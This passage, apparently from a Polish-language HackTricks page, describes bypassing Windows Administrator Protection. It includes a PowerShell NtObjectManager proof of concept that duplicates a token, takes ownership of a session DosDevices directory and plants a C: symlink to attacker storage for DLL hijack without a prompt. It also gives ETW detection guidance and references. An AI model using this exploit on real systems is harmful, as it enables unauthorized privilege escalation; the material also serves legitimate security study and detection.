2. Zduplikuj jego primary token do tokena typu **identification** i podszyj się pod niego podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z ownershipem attackera.
3. Utwórz tam symlink `C:` wskazujący na storage kontrolowany przez attackera; kolejne operacje systemu plików w tej sesji będą rozwiązywać `C:` do ścieżki attackera, umożliwiając DLL/file hijack bez promptu.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Na hostach preview funkcja Administrator Protection rejestruje zatwierdzenia i niepowodzenia jako zdarzenia ETW **15031** i **15032** u dostawcy `Microsoft-Windows-LUA`. Zdarzenia zawierają SID żądającego, ścieżkę aplikacji, wynik, zarządzane konto administratora oraz metodę uwierzytelniania, dlatego powtarzające się próby exploitów lub nieudane sterowanie interfejsem użytkownika nie pozostają pozbawione telemetrii.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jak działa User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcja technik UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – skaner kompatybilności i launcher UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI wykorzystuje AI do generowania backdoorów PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: wykorzystanie luki 0-Day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omijanie ochrony administratora systemu Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Ominięcie UAC przy użyciu zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Ominięcia UnifiedConsent, TabTip i Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Ochrona administratora](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
